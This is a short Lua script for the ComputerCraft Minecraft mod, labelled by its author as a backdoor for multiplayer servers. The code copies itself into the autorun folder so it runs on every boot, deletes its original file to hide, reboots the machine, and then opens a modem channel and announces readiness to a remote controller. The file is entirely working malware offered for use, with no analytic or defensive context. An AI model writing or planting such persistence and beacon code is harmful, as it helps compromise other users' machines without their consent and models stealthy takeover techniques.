-- computer craft SMP backdoor!
local pwd = shell.getRunningProgram();
if not fs.exists("/rom/autorun/backdoor.lua") then
local _self = fs.open(pwd, "r");
local file = fs.open("/rom/autorun/backdoor.lua", "w");
file.write(_self.readAll());
_self.close();
file.close();
fs.delete(pwd); -- Hopefully deletes the script
os.reboot();
end
-- This is how I make the backdoor auto run
function shutdown(msg)
print(msg)
os.shutdown()
end
local id = os.getComputerID();
local port = 1489;
local modem = peripheral.find("modem") or shutdown("A modem is required");
modem.open(port+id);

modem.transmit(port, port+id, id .. " Ready!")
